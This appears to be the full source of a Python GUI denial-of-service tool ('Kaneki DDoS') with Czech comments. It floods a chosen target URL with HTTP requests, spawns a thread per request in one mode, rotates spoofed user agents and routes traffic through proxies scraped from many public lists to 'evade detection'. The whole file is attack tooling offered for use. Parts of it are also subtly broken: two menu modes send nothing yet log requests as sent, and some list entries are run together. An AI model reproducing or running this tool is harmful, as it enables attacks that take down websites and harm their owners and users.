import sys
import requests
import random
import threading
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox, QComboBox, QProgressBar
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QColor, QPixmap

# --- Barevné schéma ---
COLOR_BACKGROUND = "#FFFFFF"            # čistě bílé pozadí okna
COLOR_FOREGROUND_MAIN_WINDOW = "#FFFFFF"  # bílá plocha kolem obrázku (bez rámečků)
COLOR_LABELS_BORDERS = "#000000"         # černé rámečky kolem labelů a inputů
COLOR_INPUT_BACKGROUND = "#000000"       # černé pozadí inputů
COLOR_INPUT_TEXT = "#FFFFFF"              # bílý text uvnitř inputů
COLOR_LOG_TEXT = "#202020"                # tmavě šedý text logu (ne úplně černý, aby to nebylo moc ostré)
COLOR_BUTTON_BACKGROUND = "#000000"      # černá tlačítka
COLOR_BUTTON_TEXT = "#FFFFFF"             # bílý text na tlačítkách
COLOR_BUTTON_BORDER = "#444444"           # tmavě šedý rámeček tlačítek
COLOR_ERROR_BORDER = "#FF4C4C"            # červený rámeček na chyby (stejně jako předtím)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
]

def scrape_proxies():
    """Stáhne proxy seznam z GitHub zdrojů (40+ zdrojů)."""
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/hookzOF/ProxyScrape/master/http.txt",
        "https://raw.githubusercontent.com/Anorov/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/userxd001/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
"https://raw.githubusercontent.com/ProxySurf/ProxySurf/main/http.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
"https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt""https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
"https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
"https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt""https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
"https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks4.txt",
"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt""https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
"https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt"
    ]
    proxies = []
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=5)
            proxies.extend(response.text.strip().split('\n'))
        except:
            pass
    return list(set([p for p in proxies if p]))

# --- AttackThread ---
class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    update_progress = pyqtSignal(int)

    def __init__(self, url, num_requests, attack_mode, use_proxy):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.attack_mode = attack_mode
        self.use_proxy = use_proxy
        self.proxies = []
        self.running = True
        self.current_requests_sent = 0

    def run(self):
        self.log_signal.emit("⚡ Kaneki-by-s1zixik. DDoS STARTED ⚡\n")
        if self.use_proxy:
            self.log_signal.emit("Loading proxy servers...")
            self.proxies = scrape_proxies()
            self.log_signal.emit(f"Nalezeno {len(self.proxies)} proxy." if self.proxies else "Proxy se nepodařilo načíst.")

        for i in range(self.num_requests):
            if not self.running:
                break

            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                proxy = None
                if self.use_proxy and self.proxies:
                    proxy = {"http": random.choice(self.proxies)}

                if self.attack_mode == "Normal":
                    requests.get(self.url, headers=headers, proxies=proxy, timeout=5)
                elif self.attack_mode == "Rage":
                    threading.Thread(
                        target=requests.get,
                        args=(self.url,),
                        kwargs={"headers": headers, "proxies": proxy, "timeout": 3}
                    ).start()
                
                self.current_requests_sent += 1
                log_msg = f"[{datetime.now().strftime('%H:%M:%S')}] Request {self.current_requests_sent}/{self.num_requests} (Mode: {self.attack_mode})"
                self.log_signal.emit(log_msg)
                self.update_progress.emit(int((self.current_requests_sent / self.num_requests) * 100))

            except Exception as e:
                self.log_signal.emit(f"[ERROR] Request {self.current_requests_sent} failed: {str(e)}")

        if self.running:
            self.log_signal.emit("\n✅ Kaneki DDoS FINISHED ✅")
        self.update_progress.emit(0)

    def stop(self):
        self.running = False
        self.log_signal.emit("\n⛔ Kaneki DDoS STOPPED BY USER")

# --- MainWindow ---
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Kaneki-DDoS-by-s1zixik.")
        self.setGeometry(200, 200, 650, 700)

        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {COLOR_BACKGROUND};
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
            }}
            QLabel {{
                color: {COLOR_LABELS_BORDERS};
            }}
            QLineEdit, QComboBox, QTextEdit {{
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_INPUT_TEXT};
                border: 2px solid {COLOR_LABELS_BORDERS};
                border-radius: 6px;
                padding: 6px;
            }}
            QPushButton {{
                background-color: {COLOR_BUTTON_BACKGROUND};
                color: {COLOR_BUTTON_TEXT};
                border: 2px solid {COLOR_BUTTON_BORDER};
                border-radius: 6px;
                padding: 8px;
            }}
            QPushButton:hover {{
                background-color: {COLOR_BUTTON_BORDER};
            }}
            QCheckBox {{
                color: {COLOR_LABELS_BORDERS};
            }}
            QProgressBar {{
                border: 2px solid {COLOR_LABELS_BORDERS};
                border-radius: 6px;
                text-align: center;
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_LOG_TEXT};
            }}
            QProgressBar::chunk {{
                background-color: {COLOR_BUTTON_BACKGROUND};
                border-radius: 6px;
            }}
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()

        # Log výstup
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output)

        # Přidání obrázku pod log výstup
        self.image_label = QLabel()
        pixmap = QPixmap("d267b6a1-3f72-4fd3-9da4-d16d99a23f07.png")
        if not pixmap.isNull():
            # Přizpůsobení obrázku šířce okna a zachování poměru stran
            pixmap = pixmap.scaledToWidth(600, Qt.SmoothTransformation)
            self.image_label.setPixmap(pixmap)
            self.image_label.setAlignment(Qt.AlignCenter)
            layout.addWidget(self.image_label)
        else:
            self.log_output.append("⚠️ Obrázek se nepodařilo načíst.")

        # URL
        self.url_label = QLabel("TARGET URL:")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        self.url_input.textChanged.connect(self.validate_url_input)
        layout.addWidget(self.url_label)
        layout.addWidget(self.url_input)

        # Requests
        self.requests_label = QLabel("NUMBER OF REQUESTS:")
        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText("10000")
        self.requests_input.textChanged.connect(self.validate_requests_input)
        layout.addWidget(self.requests_label)
        layout.addWidget(self.requests_input)

        # Mode
        self.mode_label = QLabel("ATTACK MODE:")
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(["Stealth", "Rage", "Overkill"])
        layout.addWidget(self.mode_label)
        layout.addWidget(self.mode_selector)

        # Proxy
        self.use_proxy = QCheckBox("AUTO-FETCH PROXIES (Evade Detection)")
        self.use_proxy.setChecked(True)
        layout.addWidget(self.use_proxy)

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)

        # Buttons
        self.start_button = QPushButton("START ATTACK")
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("STOP ATTACK")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        layout.addWidget(self.stop_button)

        central_widget.setLayout(layout)

        self.attack_thread = None

    def validate_url_input(self):
        text = self.url_input.text()
        if text.startswith("http://") or text.startswith("https://"):
            self.url_input.setStyleSheet(f"border: 2px solid {COLOR_LABELS_BORDERS};")
        else:
            self.url_input.setStyleSheet(f"border: 2px solid {COLOR_ERROR_BORDER};")

    def validate_requests_input(self):
        text = self.requests_input.text()
        if text.isdigit() and int(text) > 0:
            self.requests_input.setStyleSheet(f"border: 2px solid {COLOR_LABELS_BORDERS};")
        else:
            self.requests_input.setStyleSheet(f"border: 2px solid {COLOR_ERROR_BORDER};")

    def append_log(self, text):
        self.log_output.append(text)

    def update_progress_bar(self, val):
        self.progress_bar.setValue(val)

    def start_attack(self):
        url = self.url_input.text().strip()
        num_requests = self.requests_input.text().strip()
        attack_mode = self.mode_selector.currentText()
        use_proxy = self.use_proxy.isChecked()

        if not url.startswith("http://") and not url.startswith("https://"):
            self.append_log("[ERROR] URL musí začínat http:// nebo https://")
            return

        if not num_requests.isdigit() or int(num_requests) <= 0:
            self.append_log("[ERROR] Počet requestů musí být kladné číslo")
            return

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        self.attack_thread = AttackThread(url, int(num_requests), attack_mode, use_proxy)
        self.attack_thread.log_signal.connect(self.append_log)
        self.attack_thread.update_progress.connect(self.update_progress_bar)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread:
            self.attack_thread.stop()
            self.attack_thread = None
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
